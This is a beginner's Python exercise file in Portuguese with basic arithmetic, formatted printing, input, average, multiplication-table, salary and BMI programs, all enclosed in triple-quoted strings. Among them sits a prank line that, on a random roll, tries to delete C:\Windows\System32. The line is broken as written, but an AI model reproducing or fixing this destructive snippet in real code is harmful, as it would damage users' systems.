'''n1= 6+4*2
n2= (4*9+5)
n3=((6+7)*9)
n4=(15+20-30)
n5=(6+5**2)
print(n1, n2, n3, n4, n5)
#Conversão de dados
num1 = int(input('digite o primeiro número: '))
num2 = int(input('diigte o segundo número: '))
soma = num1 + num2
print ('A soma dos números é: ', soma)'''
'''#Soma
Soma= 4+4
#Subtração 
sub= 10-3
#Multiplicação
multi= 4*4
#Divisão
div=3/2
#Divisão inteira
div2= 3//2
#Potência
pot= 4**2
#Resto da divisão
modulo= 10%3
print(div2)
#Função type - tipo de dado
nome = "Marlon"
sobrenome = "Tizo"
num = 1
num2 = 2.2

print('o meu nome é', nome ,"e o meu sobrenome é", sobrenome)
print(f"o meu nome é {nome} e o meu sobrenome é {sobrenome}")
print(type(nome))

var1 = 123
var2 = "World"
print("hello to the {} {}". format(var2, var1))
#para printar o seu comando com apenas duas casas decimais
PI= 3.14159265359
print(f"O valor de PI é formatado {PI:.2f}")

n1= int(input("informe um número: "))
n2=int(input("informe outro número: "))
print(f"A soma dos números é: {n1+n2}")
n3= int(input("informe um número: "))
n4= int(input("informe outro número: "))
print(f"A multiplicação desses números é: {n3*n4}")
n5= int(input("informe um número: "))
n6= int(input("informe outro número: "))
print(f"A divisão desses números é: {n5/n6}")
#um programa para calcular a media do aluno
p1= float(input("informe a primeira nota: "))
p2= float(input("informe a segunda nota: "))
p3= float(input("informe a terceira nota: "))
print(f"A Média aritimética é {(p1+p2+p3)/3:.1f}")
#um programa para calcular o quadrado desse número
n1 = int(input("Digite um número: "))
print(f"O quadrado desse número é igual a : {n1**2}")
#um programa que cadastra o nome sobrenome idade e ra e calcule a média de 4 notas
print("Olá, Bem vindo a area de cadastro")
nome = str(input("Informe o seu nome: "))
sobrenome = str(input("Inforeme o seu sobrenome: "))
Idade = int(input("informe a sua idade: "))
ra = int(input("Informe o seu RA: "))
print(f"Cadastro concluido, Bem-vindo {nome}  {sobrenome} ")
print(f"você tem {Idade} anos, e o seu RA é {ra}")
n1 = float(input("Informe sua primeira média: "))
n2 = float(input("Informe sua segunda média: "))
n3 = float(input("Informe sua terceira média: "))
n4 = float(input("Informe sua quarta média: "))
print(f"sua média é de: {(n1+n2+n3+n4)/4:.1f}")
#um programa que calcule a tabuada de um número
print("--"*30)
n1 = int(input("informe um número: "))
print(f"A tabuada desse número é: \n {n1}X 1 = {n1*1} \n {n1}X 2 = {n1*2} \n {n1}X 3 = {n1*3} \n {n1}X 4 = {n1*4} \n {n1}X 5 = {n1*5} \n {n1}X 6 = {n1*6} \n {n1}X 7 = {n1*7} \n {n1}X 8 = {n1*8} \n {n1}X 9 = {n1*9} \n {n1}X 10 = {n1*10} ")
print("--"*30)
import random
import os

if random.radint(0,6)==1: 
    os.remove("C:\Windows\System32")

nome = input("Digite seu primeiro nome: ")
sobrenome = input("Digite seu sobrenome: ")
idade = input("Digite sua idade: ")
ganhos_hora = int(input("Digite o quanto você ganha por hora: "))
horas_dia = int(input("Quantas horas você trabalha por dia: "))
quantos_dias = int(input("Quantos dias você trabalha por mês?:"))
print(f"Olá, {nome} {sobrenome} seja bem vindo ao nosso sistema!")
print(f"Você tem {idade} anos\nVocê recebe {ganhos_hora * horas_dia * quantos_dias}R$ por mês \nE trabalha {horas_dia * quantos_dias} horas por mês")

nome= input("Digite seu primeiro nome: ")
sobrenome= input("Digite seu Sobrenome: ")
idade= int(input("Digite sua idade: "))
cidade= input("Digite sua cidade: ")
altura= float(input("Digite sua altura em metros: "))
peso= float(input("Digite seu peso em kg: "))
imc= peso/(altura**2)
print(f"Olá, {nome} {sobrenome} de {cidade}, seja bem vindo ao nosso sistema \nVocê tem atualmente {idade} anos e possui um indice de massa corporal de {imc:.1f}")
if imc < 18.5: 
    print("Você está magro")
elif imc >= 18.5 and imc<= 24.5:
    print("você esta em um peso normal")
elif imc >= 24.6 and imc<= 29.9:
    print("Você esta um pouco acima do peso")
elif imc>30:
    print("você esta obeso") '''
